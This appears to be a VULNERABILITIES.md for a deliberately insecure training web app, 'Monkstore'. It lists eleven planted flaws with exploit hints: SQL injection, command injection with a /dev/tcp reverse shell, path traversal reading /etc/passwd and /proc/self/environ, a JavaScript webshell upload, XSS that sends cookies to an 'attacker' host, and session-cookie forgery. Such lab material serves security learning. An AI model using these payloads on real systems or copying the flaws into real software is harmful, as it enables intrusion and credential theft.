# VULNERABILITIES.md

Intentional security flaws added to Monkstore for local security testing and learning.

**Never expose this application to a public network.**

---

## 1. SQL Injection

**Endpoint:** `GET /api/search?q=<payload>`

**Location:** `backend/server.js` — `/api/search` handler

**How it works:** The `q` parameter is concatenated directly into the SQL query string with no escaping.

**Exploit hints:**
```
# Dump all monkeys regardless of name
GET /api/search?q=' OR '1'='1

# UNION-based data extraction (adjust column count as needed)
GET /api/search?q=' UNION SELECT id,username,email,password FROM profile--
```

The error response also echoes back the full SQL query on failure, leaking schema info.

---

## 2. Command Injection

**Endpoint:** `GET /api/ping?host=<payload>`

**Location:** `backend/server.js` — `/api/ping` handler

**How it works:** The `host` parameter is appended directly to a `ping` shell command via `child_process.exec`.

**Exploit hints:**
```
# Run id command
GET /api/ping?host=127.0.0.1;id

# Read /etc/passwd
GET /api/ping?host=127.0.0.1;cat+/etc/passwd

# Reverse shell (adjust IP/port)
GET /api/ping?host=127.0.0.1;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'
```

Note: The backend also shells out to `psql` for every SQL query — some SQLi payloads may additionally break shell context.

---

## 3. Broken Access Control — IDOR

**Endpoint:** `GET /api/user?id=<uuid>`

**Location:** `backend/server.js` — `/api/user` handler

**How it works:** No authentication token required. Returns full profile including password hash for any user ID.

**Exploit hints:**
```
# Enumerate users by UUID (get IDs from /api/admin/users or SQLi above)
GET /api/user?id=<any-uuid>
```

---

## 4. Broken Access Control — Trivial Admin Bypass

**Endpoint:** `GET /api/admin/users`

**Location:** `backend/server.js` — `/api/admin/users` handler; `frontend/admin.html`

**How it works:** The only "security check" is whether the request contains `X-Admin: true` header. No token or role verification.

**Exploit hints:**
```
curl http://localhost:3000/api/admin/users -H "X-Admin: true"
```

The `/admin.html` frontend page is also accessible by any user — it automatically sends the bypass header.

---

## 5. Local File Inclusion / Path Traversal

**Endpoint:** `GET /api/file?name=<path>`

**Location:** `backend/server.js` — `/api/file` handler

**How it works:** The `name` parameter is joined to `/usr/src/app/` with `path.join`. An absolute path starting with `/` overrides the prefix entirely.

**Exploit hints:**
```
# Read the backend source
GET /api/file?name=server.js

# Path traversal
GET /api/file?name=../../../etc/passwd

# Absolute path override
GET /api/file?name=/etc/hostname
GET /api/file?name=/proc/self/environ
```

---

## 6. Unrestricted File Upload

**Endpoint:** `POST /api/upload`

**Location:** `backend/server.js` — `/api/upload` handler

**How it works:** No extension or MIME-type validation. The filename comes from the `X-Filename` request header. Files are saved to `/usr/src/app/uploads/` and served back at `/api/uploads/<filename>`.

**Exploit hints:**
```bash
# Upload a JS "webshell" (Node exec via query param)
curl -X POST http://localhost:3000/api/upload \
  -H "X-Filename: shell.js" \
  --data-binary 'require("child_process").exec(require("url").parse(process.env.__URL||"","true").query.cmd,(e,o)=>process.stdout.write(o))'

# Retrieve uploaded file
GET /api/uploads/shell.js
```

---

## 7. Reflected XSS

**Location:** `frontend/js/main.js` — `displayNFTs()` function (shop page)

**How it works:** When a search returns no results, the raw search term is injected into `innerHTML` without sanitization.

**Exploit hints:**
```
# In the shop search box, enter:
<img src=x onerror=alert(document.cookie)>

# Or via URL (if linked):
/shop.html — then type the payload in the search field
```

---

## 8. Stored XSS

**Endpoint:** `POST /api/reviews` + `GET /api/reviews?nftId=X`

**Location:** `backend/server.js` — reviews handlers; `frontend/nft.html` — review rendering

**How it works:** Review content is stored verbatim in the database and rendered via `innerHTML` on the NFT detail page without any sanitization.

**Exploit hints:**
```
# Post a review with XSS payload to any NFT
POST /api/reviews
{"nftId":"monk-001","author":"attacker","content":"<img src=x onerror=alert(document.cookie)>"}

# Or a persistent keylogger/cookie stealer:
{"nftId":"monk-001","content":"<script>fetch('http://attacker/steal?c='+document.cookie)</script>"}

# View at: /nft.html?id=monk-001
```

---

## 9. Sensitive Data Exposure (Debug Endpoint)

**Endpoint:** `GET /api/debug`

**Location:** `backend/server.js` — `/api/debug` handler; `frontend/admin.html`

**How it works:** Returns `JWT_SECRET`, `DATABASE_URL`, database credentials, memory usage, and Node.js version. No authentication required.

```
GET /api/debug
```

With `JWT_SECRET` in hand, an attacker can forge valid JWT tokens for any user ID.

---

## 10. Insecure Deserialization — Unsigned Session Cookie

**Endpoint:** `GET /api/session`

**Location:** `backend/server.js` — `/api/session` handler

**How it works:** Sets a `session` cookie containing base64-encoded JSON `{userId, isAdmin: false, ts}`. There is no HMAC signature — anyone can decode, modify, and re-encode the cookie.

**Exploit hints:**
```bash
# Get initial session cookie
curl -c cookies.txt http://localhost:3000/api/session

# Decode, modify, re-encode
python3 -c "
import base64, json
orig = '<paste base64 cookie value>'
d = json.loads(base64.b64decode(orig))
d['isAdmin'] = True
print(base64.b64encode(json.dumps(d).encode()).decode())
"

# Send forged cookie
curl http://localhost:3000/api/session -H "Cookie: session=<forged_value>"
# Response: { isAdmin: true }
```

---

## 11. Security Misconfiguration — Verbose Errors

**Locations:**
- All `runQuery` error handlers return `detail: e.message` with raw PostgreSQL error text
- `/api/search` returns the full SQL query string on error
- `/api/file` returns the attempted filesystem path on error
- `/api/debug` exposes full environment and DB credentials (see #9)

**HTML comments with sensitive info** — check page source of `admin.html` for inline hints about bypass techniques.

---

## Quick-Reference Cheat Sheet

| # | Vulnerability | Endpoint / Location |
|---|---|---|
| 1 | SQL Injection | `GET /api/search?q=` |
| 2 | Command Injection | `GET /api/ping?host=` |
| 3 | IDOR | `GET /api/user?id=` |
| 4 | Broken Access Control | `GET /api/admin/users` + `X-Admin: true` |
| 5 | LFI / Path Traversal | `GET /api/file?name=` |
| 6 | Unrestricted Upload | `POST /api/upload` |
| 7 | Reflected XSS | Shop search box → `displayNFTs()` |
| 8 | Stored XSS | `POST /api/reviews` → `/nft.html?id=` |
| 9 | Sensitive Data Exposure | `GET /api/debug` |
| 10 | Insecure Deserialization | `GET /api/session` cookie |
| 11 | Verbose Errors / Misconfig | All error responses + HTML comments |
